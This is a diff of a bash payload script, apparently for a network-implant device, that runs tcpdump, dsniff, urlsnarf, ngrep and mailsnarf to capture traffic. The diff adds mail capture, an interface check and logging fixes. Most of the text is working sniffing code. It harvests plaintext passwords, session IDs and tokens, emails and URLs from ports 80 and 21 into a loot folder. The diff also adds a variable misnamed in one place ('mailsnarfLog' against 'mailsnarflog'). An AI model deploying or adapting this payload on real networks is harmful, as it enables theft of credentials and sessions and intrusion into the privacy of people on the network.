@@ -1,15 +1,15 @@
 #!/bin/bash
-# 
+#
 # Title:		iSpy Passive Intel Gathering
 
-# Description:		Launches various tools to sniff out intel data. 
-#			Payload will run until the button is pressed. 
+# Description:		Launches various tools to sniff out intel data.
+#			Payload will run until the button is pressed.
 
 # Author: 		infoskirmish.com
 # Version:		1.0
 # Category:		sniffing
 # Target: 		Any
-# Net Mode:		Any (you choose)
+# Net Mode:		Any (default: Transparent)
 
 # LEDs
 # SUCCESS:		Payload ended complete
@@ -22,9 +22,9 @@ Date=$(date +%Y-%m-%d-%H%M)			# Date format to use for log files
 dsnifflog="dsniff_$Date.log"			# DSNiff log file name
 urlsnifflog="urlsnarf_$Date.log"		# URLSniff log file name
 tcpdumplog="tcpdump_$Date.pcap"			# TCPDump log file name
-httppwdlog="httpPasswords_$Date.log"		# Potential HTTP password file name
-sessionidlog="sessionids_$Date.log"		# Potential Session IDs file name
-
+httppwdlog="httpPasswords_$Date.pcap"		# Potential HTTP password file name
+sessionidlog="sessionids_$Date.pcap"		# Potential Session IDs file name
+mailsnarfLog="mailsnarf_$Date.pcap"		# Mailsnarf data log file path.
 
 function monitor_space() {
 	while true
@@ -62,13 +62,17 @@ function finish() {
 	kill $5
 	wait $5
 
+        # Kill Mail Snarf
+        kill $6
+        wait $6
+
 	# I found that if this payload had been running awhile the next two steps may take a bit. It is useful to have some kind of indication
 	# that the payload accepted your button push and is responding. Thus the rapid white blink.
 	LED W VERYFAST
 
 	# Dump all unique IP address from TCP Dump file.
 	tcpdump -qns 0 -X -r $lootPath/$tcpdumplog | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort | uniq >> $lootPath/ipv4found_$Date.txt
- 	
+
 	# Ok this is a really stupid grep pattern matching to search for emails; it is meant to give an over view of what is possible.
 	tcpdump -qns 0 -X -r $lootPath/$tcpdumplog | grep -Eiv "[\.]{2}" | grep -oE "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b" | sort | uniq >> $lootPath/maybeEmails_$Date.txt
 
@@ -80,7 +84,7 @@ function finish() {
 
 	# Halt the system; turn off LED
 	LED OFF
-	halt
+	#halt
 }
 
 function run() {
@@ -89,59 +93,79 @@ function run() {
 	mkdir -p $lootPath &> /dev/null
 
 	# Set networking to TRANSPARENT mode and wait five seconds
-	NETMODE $mode
-	sleep 5
+	#NETMODE $mode
+	#sleep 5
 
 	# Start tcpdump on the specified interface
 	tcpdump -i $interface -w $lootPath/$tcpdumplog &>/dev/null &
 	tpid=$!
 
 	# Log TCP Dump Start
-	echo "TCPDump started pid=$tpid" > $lootPath/log.txt
-	
+	echo "TCPDump started pid=$tpid" >> $lootPath/log.txt
+
 	# Start urlsnarff on the specified interface
 	urlsnarf -n -i $interface >> $lootPath/$urlsnifflog &
 	urlid=$!
 
 	# Log URL Snarff Start
-	echo "URLSnarf started pid=$urlid" > $lootPath/log.txt
+	echo "URLSnarf started pid=$urlid" >> $lootPath/log.txt
 
 	# Start dsniff on the specified interface
 	dsniff -c -m -i $interface -w $lootPath/$dsnifflog &
 	dsniffid=$!
 
 	# Log DSNiff Start
-	echo "DSNiff started pid=$dsniffid" > $lootPath/log.txt
+	echo "DSNiff started pid=$dsniffid" >> $lootPath/log.txt
 
 	# Log potential plain text user names and passwords on port 80 and 21
 	# The thing is port 21 is the defult ftp port. Passwords and user names are exchanged in clear text!!!
 	ngrep -d $interface -i "user_pass|userid|pass|pwd|password|login|user_login|usr|USER" -W byline port 80 or port 21 -O $lootPath/$httppwdlog &	
 	pwdgrep=$!
-	
+
 	# Log Password NGREP Start
-	echo "Password NGREP started pid=$pwdgrep" > $lootPath/log.txt
+	echo "Password NGREP started pid=$pwdgrep" >> $lootPath/log.txt
 
 	# Log potential plain text session ids, tokens, etc.
 	ngrep -d $interface -i "session|sessid|token|loggedin|PHPSESSID|CFTOKEN|CFID|JSESSIONID|sessionid" -W byline port 80 or port 21 -O $lootPath/$sessionidlog &
-	sessiongrep=$!	
+	sessiongrep=$!
 
 	# Log Session NGREP Start
-	echo "Session NGREP started pid=$sessiongrep" > $lootPath/log.txt
+	echo "Session NGREP started pid=$sessiongrep" >> $lootPath/log.txt
+
+	# Log mailsnarf data
+	mailsnarf -i $interface -p $lootPath/$mailsnarflog &
+	mailsnarfid=$!
+
+	# Log mailsnarf Start.
+	echo "Mailsnarf started pid=$mailsnarfid" >> $lootPath/log.txt
 
 	# Wait for button to be pressed (disable button LED)
 	NO_LED=true BUTTON
-	finish $urlid $dsniffid $tpid $pwdgrep $sessiongrep
+	finish $urlid $dsniffid $tpid $pwdgrep $sessiongrep $mailsnarfid
 }
 
 
 # This payload will only run if we have USB storage
 if [ -d "/mnt/loot" ]; then
 
-	echo "" > $lootPath/log.txt
+    # Lets make sure the interface the user wanted actually exisits.
+    if [[ $(ifconfig |grep $interface) ]]; then
 
-	LED ATTACK
-	run &
-	monitor_space $! &
+	   echo "" > $lootPath/log.txt
+
+	   LED ATTACK
+	   run &
+	   monitor_space $! &
+       
+    else
+
+	   # Interface could not be found; log it in ~/payload/switch1/log.txt
+	   echo "Could not load interface $interface. Stopping..." > log.txt
+
+	   # Display FAIL LED 
+	   LED FAIL
+
+    fi
 
 else
 
